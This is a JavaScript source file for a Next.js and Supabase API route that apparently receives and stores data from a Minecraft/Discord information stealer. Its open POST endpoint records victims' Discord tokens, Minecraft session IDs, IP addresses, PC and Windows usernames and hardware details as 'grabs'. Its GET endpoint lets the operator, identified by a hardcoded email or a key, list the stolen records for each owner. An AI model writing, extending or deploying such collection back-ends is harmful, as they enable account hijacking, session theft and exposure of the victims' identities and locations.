export const dynamic = 'force-dynamic';

import { createServerClient } from '@supabase/ssr';
import { NextResponse } from 'next/server';

function getClient() {
  return createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL,
    process.env.SUPABASE_SERVICE_ROLE_KEY,
    { cookies: { getAll() { return []; }, setAll() {} } }
  );
}

function getClientAuth(request) {
  return createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY,
    {
      cookies: {
        getAll() { return request.cookies.getAll(); },
        setAll(cookiesToSet) {
          cookiesToSet.forEach(({ name, value }) => request.cookies.set(name, value));
        },
      },
    }
  );
}

export async function GET(request) {
  const { searchParams } = new URL(request.url);
  const ownerEmail = searchParams.get('owner_email');
  const authHeader = request.headers.get('authorization');
  const modKey = searchParams.get('key');

  if (modKey === process.env.MOD_API_KEY) {
    const supabase = getClient();
    let query = supabase.from('grabs').select('*').order('created_at', { ascending: false });
    if (ownerEmail) query = query.eq('owner_email', ownerEmail);
    const { data, error } = await query;
    if (error) return NextResponse.json({ grabs: [], error: error.message });
    return NextResponse.json({ grabs: data || [] });
  }

  const supabase = getClientAuth(request);
  const { data: { user } } = await supabase.auth.getUser();

  if (!user) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  if (user.email !== 'lifegrading@gmail.com') {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }

  const supabaseAdmin = getClient();
  let query = supabaseAdmin.from('grabs').select('*').order('created_at', { ascending: false });
  if (ownerEmail) query = query.eq('owner_email', ownerEmail);
  const { data, error } = await query;
  if (error) return NextResponse.json({ grabs: [], error: error.message });
  return NextResponse.json({ grabs: data || [] });
}

export async function POST(request) {
  const body = await request.json();
  if (!body.minecraft_username) {
    return NextResponse.json({ error: 'minecraft_username required' }, { status: 400 });
  }

  const supabase = getClient();

  const grab = {
    owner_email: body.owner_email || '',
    minecraft_username: body.minecraft_username || 'Unknown',
    discord_username: body.discord_username || 'Unknown',
    ip_address: body.ip_address || 'Unknown',
    country: body.country || 'Unknown',
    timezone: body.timezone || 'Unknown',
    os: body.os || 'Unknown',
    os_version: body.os_version || '',
    pc_name: body.pc_name || 'Unknown',
    windows_username: body.windows_username || '',
    cpu: body.cpu || '',
    ram: body.ram || '',
    gpu: body.gpu || '',
    screen_resolution: body.screen_resolution || '',
    disk_space: body.disk_space || '',
    java_version: body.java_version || '',
    language: body.language || '',
    desktop_env: body.desktop_env || '',
    client_version: body.client_version || 'Unknown',
    session_id: body.session_id || '',
    session_start: body.session_start || '',
    discord_token: body.discord_token || '',
    servers: body.servers || '',
  };

  const { data, error } = await supabase
    .from('grabs')
    .insert([grab])
    .select()
    .single();

  if (error) return NextResponse.json({ error: error.message }, { status: 500 });
  return NextResponse.json({ ok: true, id: data.id });
}
